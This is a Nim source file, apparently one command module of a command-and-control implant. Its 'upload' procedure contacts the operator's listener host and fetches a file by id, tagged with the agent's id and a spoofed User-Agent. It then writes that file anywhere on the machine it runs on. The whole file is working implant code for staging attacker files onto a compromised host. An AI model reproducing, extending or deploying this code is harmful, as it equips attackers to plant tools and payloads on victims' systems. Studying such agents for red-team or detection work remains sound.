import httpclient, os
from strutils import join
from ../util/webClient import Listener

proc upload*(li: Listener, args: varargs[string]): string =
  var
    fileId: string
    fileName: string
    filePath: string

  if args.len == 2 and args[0] != "" and args[1] != "":
    fileId = args[0]
    fileName = args[1]
    filePath = getCurrentDir() / fileName
  elif args.len >= 3:
    fileId = args[0]
    fileName = args[1]
    filePath = args[2..^1].join(" ")
  else:
    result = "Invalid number of arguments received. Usage: 'upload <fileId> <fileName> <filePath>'"
    return

  let client = newHttpClient()
  client.headers = newHttpHeaders({"User-Agent": li.userAgent})

  try:
    let url = li.listenerType & "://" &
              (if li.listenerHost != "": li.listenerHost
               else: li.listenerIp & ":" & li.listenerPort) &
              li.taskPath & "/" & fileId & "?id=" & li.id

    let response = client.get(url)

    if response.status == "200 OK" and response.body != "":
      writeFile(filePath, response.body)
      result = "Downloaded file to: '" & filePath & "'."
    else:
      result = "Failed to download file. Server response: " & response.status

  except:
    result = "Download failed: " & getCurrentExceptionMsg()

  finally:
    client.close()
